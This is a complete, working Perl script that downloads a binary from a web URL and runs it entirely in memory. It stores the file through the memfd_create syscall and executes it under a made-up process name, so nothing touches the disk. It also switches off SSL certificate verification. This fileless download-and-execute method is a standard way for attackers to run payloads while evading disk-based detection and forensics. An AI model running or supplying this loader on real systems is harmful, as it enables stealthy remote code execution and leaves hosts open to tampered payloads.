#!/usr/bin/env perl
#
# Load binary program from web server (http or https)
# and execute the binary without touching the storage drive.
# Stores the file in the process memory /proc/id.
#
# Script arguments:
# 1) URL to load the binary program.
# 2) Name of program to use for execution (because it has no file name).
# 3) optional: arguments passed thru to the program.
#
# Needs Linux kernal >= 3.17
#
# In-Memory-Only ELF Execution (Without tmpfs)
# https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
 
use warnings;
use strict;
# Import user agent ($ua) and get to file function.
use LWP::Simple qw($ua get getstore);
use Config;

if($Config{archname} !~ /x86_64-linux/) {
  die "current version needs x86_64 linux, but found $Config{archname}"; }

# No check of the SSL certifacte
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0);

# 1st Argument of the script is the URL to load
my $url = shift or die "missing argument, the URL";
# 2nd Argument is the program name to use
my $prog = shift or die "missing argument, program name";

# Create an anonymous file with name "" and close-on-exec (=1) flag
# Call memfd_create function via his 64-bit Linux system call number 319
# The call number depends on the architecture. A table archname - number
# could be implemented in the next version.
my $name = "";
my $fd = syscall(319, $name, 1);
if($fd == -1) { die "can't create anon file, $!"; }

# Copy URL content to the anonymous file
my $code = getstore( $url, "/proc/$$/fd/$fd" );
print "returned code: ", $code,"\n";

# Execute the binary program
exec {"/proc/$$/fd/$fd"} $prog,@ARGV;

